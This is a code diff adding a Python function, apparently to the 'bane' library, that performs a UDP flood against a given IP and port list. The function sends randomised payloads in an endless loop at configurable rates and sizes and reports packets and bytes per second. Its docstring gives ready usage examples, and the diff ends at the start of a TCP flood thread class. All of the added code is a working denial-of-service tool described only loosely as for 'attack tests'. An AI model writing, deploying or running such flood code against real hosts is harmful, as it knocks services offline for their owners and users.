@@ -1,3 +1,84 @@
+def udp(u,port=80,ports=None,level=3,size=3,connection=True):
+  '''
+   this function is for UDP flood attack tests.
+   
+   it takes 5 arguments:
+
+   u: targeted ip
+   port: (set by default to: 80) targeted port
+   ports: (set by default to: None) it is used to define a list of ports to attack all without using multithreading, if its value has changed
+   to a list, the port argument will be ignored and the list will be used instead, so be careful and set everything correctly.
+   it should be defined as a list of integers seperated by ',' like: [80,22,21]
+   connection: (set by default to: True) to make a connection before sending the packet
+   level: (set by default to: 3) it defines the speed rate to send the packets:
+
+   level=1 :  send packets with delay of 0.1 second between them
+   level=2 :  send packets with delay of 0.01 second between them
+   level=3 :  send packets with delay of 0.001 second between them
+
+   size: (set by default to: 3) multiplying the size of the generated payloads:
+
+   size=1 :  size of payload * 1
+   size=2 :  size of payload * 10
+   size=3 :  size of payload * 100
+
+   when the attack starts you will see a stats of: total packets sent, packets sent per second, and bytes sent per second
+
+   usage:
+
+   >>>import bane
+   >>>ip='25.33.26.12'
+   >>>bane.udp(ip)
+
+   >>>bane.udp(ip,port=80,level=1,size=3)
+
+   >>>bane.udp(ip,ports=[21,50,80],level=2)
+   
+  '''
+  global rate1
+  global rate2
+  global packets
+  if level<=1:
+   t=.1
+  elif level==2:
+   t=.01
+  elif level>=3:
+   t=.001
+  if size<=1:
+   m=1
+  elif size==2:
+   m=10
+  elif size>=3:
+   m=100
+  tm=time.time()
+  while True:
+   try:
+    if ports:
+     p=random.choice(ports)
+    else:
+     p=port
+    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    if connection==True:
+     s.connect((u,p))
+    msg=''
+    for x in range(random.randint(10,30)):
+     msg+=str(random.randint(0,1000000))+random.choice(lis)
+    msg=msg*m
+    s.sendto((msg),(u,p))
+    packets+=1
+    rate1+=1
+    rate2+=len(msg)
+    if int(time.time()-tm)==1:
+     sys.stdout.write("\rStats=> Packets sent: {} | Rate: {} packets/s  {} bytes/s".format(packets,rate1,rate2))
+     sys.stdout.flush()
+     tm=time.time()
+     rate1=0
+     rate2=0
+   except KeyboardInterrupt:
+    break
+   except Exception as e:
+    pass
+   time.sleep(t)
 class tcflood(threading.Thread):
  def run(self):
   global counter
